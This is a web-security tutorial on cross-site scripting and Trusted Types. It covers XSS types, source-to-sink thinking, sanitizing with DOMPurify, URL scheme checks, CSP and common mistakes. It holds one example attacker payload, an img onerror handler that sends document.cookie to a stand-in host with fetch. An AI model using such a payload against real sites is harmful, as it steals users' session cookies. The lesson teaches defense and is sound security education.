XSS & Trusted Types

Cross-site scripting lets an attacker run their JavaScript as your site. It remains the most common browser security bug, and the defense is a mix of safe APIs, context-aware escaping, and a browser-enforced policy.

§1How XSS Happens

XSS occurs when untrusted data ends up interpreted as code or markup instead of plain text. Once an attacker's script runs on your origin, it can read the DOM and storage, make authenticated requests as the user, and rewrite the page. There are three families:

TypeWhere the payload livesExample
StoredSaved on the server, shown to othersA comment containing <img onerror=...>
ReflectedIn the request, echoed in the responseA search page that prints ?q= unescaped
DOM-basedNever leaves the browser: script reads a source and writes to a sinkel.innerHTML = location.hash.slice(1)
// vulnerable: a URL-controlled source flows into a dangerous sink
const name = new URLSearchParams(location.search).get("name");
greeting.innerHTML = "Hello, " + name;
// attacker link: ?name=<img src=x onerror="fetch('//evil.test/?c='+document.cookie)">

// safe: the same data treated as text
greeting.textContent = "Hello, " + name;

Think in terms of sources (URL, postMessage, storage, API responses, user input) and sinks (innerHTML, outerHTML, insertAdjacentHTML, document.write, eval, new Function, setTimeout(string), script.src, location = ... with javascript:). Every path from a source to a sink needs a defense.

§2Defenses That Work

Layer the defenses, from the most reliable to the safety nets:

  1. Use safe APIs by default: textContent, setAttribute for known-safe attributes, createElement. Frameworks escape by default; the unsafe escape hatches (dangerouslySetInnerHTML, v-html) are where bugs hide.
  2. Encode for the context: HTML text, attribute values, URLs, and JavaScript strings each need different escaping. Never build HTML with string concatenation.
  3. Sanitize when HTML is required (rich text from users): use a well-maintained sanitizer such as DOMPurify, or the browser's Sanitizer API where available, with an allow-list. Do not write your own with regexes.
  4. Validate URLs: allow only https: (and mailto:) schemes before putting user data in href or src.
  5. Add a Content Security Policy as a second line of defense (next lesson), and HttpOnly cookies so a successful XSS cannot read the session.
import DOMPurify from "dompurify";

// user wrote rich text; allow a small safe subset only
const clean = DOMPurify.sanitize(userHtml, { ALLOWED_TAGS: ["b", "i", "em", "strong", "a", "p", "ul", "li"], ALLOWED_ATTR: ["href"] });
article.innerHTML = clean;

function safeUrl(input) {
  try {
    const u = new URL(input, location.origin);
    return ["https:", "http:", "mailto:"].includes(u.protocol) ? u.href : "about:blank";
  } catch { return "about:blank"; }
}
link.href = safeUrl(userSuppliedUrl);        // blocks javascript: URLs

§3Trusted Types

Trusted Types turn "never pass a string to a dangerous sink" from a convention into something the browser enforces. When enabled via CSP, sinks like innerHTML refuse plain strings and accept only special TrustedHTML objects, which can be created only by policies you define in one small, reviewable place.

// response header: enforce Trusted Types for scripts
Content-Security-Policy: require-trusted-types-for 'script'; trusted-types app-html

// the one place HTML strings are blessed
const policy = trustedTypes.createPolicy("app-html", {
  createHTML: (input) => DOMPurify.sanitize(input, { RETURN_TRUSTED_TYPE: false }),
});

el.innerHTML = userHtml;                     // TypeError: requires TrustedHTML
el.innerHTML = policy.createHTML(userHtml);  // allowed: went through the policy

This changes the audit problem: instead of reviewing every innerHTML in a large codebase and in all dependencies, you review a handful of policies, and the browser blocks everything else. Roll it out in report-only mode first (Content-Security-Policy-Report-Only) to find violations without breaking users.

Fix the sink, not the symptom Filtering for <script> is a losing game: attackers have thousands of payloads. Use APIs that cannot interpret data as code, and make the browser reject the dangerous ones.

§4Common Mistakes

MistakeWhat HappensFix
Blocklisting <script> or stripping tags with a regexTrivially bypassed with event handlers, SVG, or encodingsUse textContent or a proper sanitizer with an allow-list
Putting user URLs in href without checking the schemejavascript: URLs execute script on clickAllow only https:/mailto:; reject the rest
Sanitizing once, then modifying the HTML afterwardsLater changes can reintroduce a vulnerabilitySanitize as the last step before the sink
Enabling Trusted Types enforcement without a report-only phaseBreakage in production from unknown violationsRun report-only first, fix, then enforce
Practice
  1. Build a page with a DOM-based XSS from location.hash, demonstrate it, and fix it two ways (safe API and sanitizer).
  2. Write a safeUrl function and test it against javascript:, data:, JaVaScRiPt:, and relative URLs.
  3. Enable Trusted Types in report-only mode for a small app and list every violation it reports.
Key takeaways
  • XSS is untrusted data interpreted as code; think in sources and sinks.
  • Prefer safe APIs and context-aware encoding; sanitize with an allow-list library when you must allow HTML.
  • Trusted Types make the browser enforce safe sinks, concentrating review on a few policies.
